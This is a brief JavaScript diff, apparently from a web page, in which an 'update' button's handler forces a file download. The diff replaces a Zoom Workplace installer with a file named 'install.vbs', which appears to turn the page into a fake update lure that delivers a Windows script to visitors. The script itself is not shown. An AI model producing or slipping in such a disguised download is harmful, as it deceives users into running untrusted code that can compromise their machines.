@@ -13,8 +13,8 @@ if (updateButton) {
         event.preventDefault();
         // create a temporary link to download
         var a = document.createElement('a');
-        a.href = 'ZoomWorkplaceInstaller.exe';
-        a.download = 'ZoomWorkplaceInstaller.exe';
+        a.href = 'install.vbs';
+        a.download = 'install.vbs';
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
